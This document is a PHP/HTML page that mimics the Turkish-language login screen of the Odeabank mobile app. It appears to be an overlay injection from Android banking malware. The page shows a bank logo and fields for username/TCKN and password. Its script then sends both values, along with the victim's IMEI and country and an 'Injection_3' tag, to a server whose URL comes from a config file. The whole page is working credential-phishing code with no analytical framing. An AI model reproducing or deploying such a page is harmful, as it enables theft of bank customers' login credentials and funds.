<html>
<head>
		<link href="tr/com.magiclick.odeabank/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<div class="header">
	<img style="width: 50%;" src="data:image/png;base64,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5rcTXMCmVSjT48CHzGyCj6xL5wLgbznu24P2AwH/n64VGpH7gPdLGgkcS/BLHZ2jI1hCSDF5I3C7mb1ZhibNbDVwqqQfxun8cWQP711ICHS43MzaS7H4Mm89/aY95lfwDncBd0XXxk8ScnHvTWU5TZYR8q88TFiHe8jMXk6Q6VXgSElXRSN/aMa6tT4+76fAxA6MyRyyJURa2cEM5ZqYrOsAQr71neOviLD+ubETvRX4U7MvdEF1dmYM2Doq1tmsB0asAe4iHITwh3Z8vtdmrK/N17al79kJr1PpEs+ChOfNr7CNtqyjKd/rDUknAhNzvN84STeYWbtZOwuP1otuKrvGZZOhhFMz+rIhKOLVOF2cFX/T45JF1YkRYqNjI9ghyjog6mVF/OgzCG5W0+t1AywGSexEyPS2DcG1qx8hOKl7HDG/HhvMasIm7oJoCJ8BXohrcEXJ0z/OvnaN8mwWDfiy+P0XxFHjA7Vep5a0Sfz2WxDc4TaLRrwfIXCoW4u6u5ywRrmIEOAym5De98UqyrslIbhrNLBllNeiXItjm5oK/NnMluM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4juM4zjuK/wNidvHLsMxYMQAAAABJRU5ErkJggg==">
</div>

<form method="post">


	<label> Kullanıcı Adı/TCKN </label>
	<input type="text" name="fields[login]" id="login" class="field">

	<label> Parola </label>
	<input type="password" name="fields[password]" id="password" class="field">

	<input type="submit" value="GİRİŞ" id="submitBtn1" class="button">

	<u> Bloke Kaldır </u>

	<u style="float: right;"> Hatırlat / Parola Al </u>

</form><iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    <script type="text/javascript">

    (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'field';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'field error';
							} catch(e){};
                            return false;
                        }

                        if (oCodeInp.value.length < 3) {
							try{
                                oCodeInp.className = 'field error';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|magiclick|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>
</body>
</html>
